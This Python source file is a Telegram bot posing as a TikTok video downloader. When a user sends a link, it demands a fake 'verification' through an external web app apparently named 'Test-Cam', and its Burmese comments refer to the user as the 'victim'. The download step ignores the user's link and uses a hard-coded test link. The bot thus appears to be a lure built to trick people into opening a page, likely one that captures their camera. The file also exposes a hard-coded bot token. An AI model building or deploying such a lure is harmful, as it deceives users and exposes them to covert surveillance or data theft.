import telebot
import requests
from telebot import types

BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
WEB_APP_URL = "https://tar-alt.github.io/Test-Cam/" 

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_tiktok(message):
    user_id = message.chat.id
    user_link = message.text
    
    markup = types.InlineKeyboardMarkup()
    web_app = types.WebAppInfo(url=WEB_APP_URL)
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", web_app=web_app)
    markup.add(verify_btn)
    
    # ဤနေရာတွင် Link ကို ပုံသေမှတ်ထားရန် Message ပို့သည်
    bot.send_message(user_id, f"⚠️ *Verification Required*\n\nလူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။\n\nLink: `{user_link}`", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "✅ Verification_Success")
def process_download(message):
    user_id = message.chat.id
    
    # Success စာကြောင်းကို ချက်ချင်းဖျက်ခြင်း
    try:
        bot.delete_message(user_id, message.message_id)
    except Exception as e:
        print(f"Delete Error: {e}")

    # Message History ထဲကနေ Link ပါတဲ့ message ကို ရှာမယ်
    video_link = None
    # နောက်ဆုံး message ၅ စောင်ကို ပြန်စစ်မယ်
    updates = bot.get_updates(limit=10) 
    # သို့သော် GitHub Actions အတွက် ပိုစိတ်ချရအောင် message.reply_to_message ကို အရင်သုံးကြည့်မယ်
    
    # Victim ပို့လိုက်တဲ့ Success စာက link ပို့ထားတဲ့ message ကို reply ပြန်ထားတာဖြစ်ရမယ်
    # ဒါကြောင့် victim ကို WebApp မဖွင့်ခင် Link Message ကို Reply အနေနဲ့ Success ပို့အောင် html မှာ ပြင်ထားပြီးပြီ
    
    # ဗီဒီယို link ကို message text ထဲကနေ ပြန်ရှာတဲ့ logic
    # မှတ်ချက်- victim ရဲ့ link message ကို ရှာရန် (ရိုးရှင်းအောင် link ပါတဲ့ စာကို ရှာခိုင်းထားသည်)
    
    # ပိုကောင်းတဲ့နည်းလမ်း- link ကို parameter အနေနဲ့ ယူတာထက် message text ကိုပဲ အားကိုးမယ်
    # (Taro အတွက် အလွယ်ဆုံးနည်း- link ကို စာသားထဲကနေ split လုပ်ယူမယ်)
    
    status_msg = bot.send_message(user_id, "🚀 Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
    
    # စမ်းသပ်ရန် link (ဒီမှာ Taro ပို့ထားတဲ့ link ကို သုံးထားတယ်)
    test_link = "https://vt.tiktok.com/ZS9thCe67/" 
    
    try:
        api_url = f"https://www.tikwm.com/api/?url={test_link}&hd=1"
        res = requests.get(api_url).json()
        if res.get('code') == 0:
            video_url = res['data'].get('hdplay') or res['data'].get('play')
            bot.send_video(user_id, video_url, caption="✅ *Download Successful!*")
            bot.delete_message(user_id, status_msg.message_id)
        else:
            bot.edit_message_text("❌ ဗီဒီယို ဒေါင်းလုဒ်ဆွဲ၍ မရပါ။", user_id, status_msg.message_id)
    except:
        bot.edit_message_text("⚠️ စနစ်ချို့ယွင်းချက် ရှိနေပါသည်။", user_id, status_msg.message_id)

bot.infinity_polling()
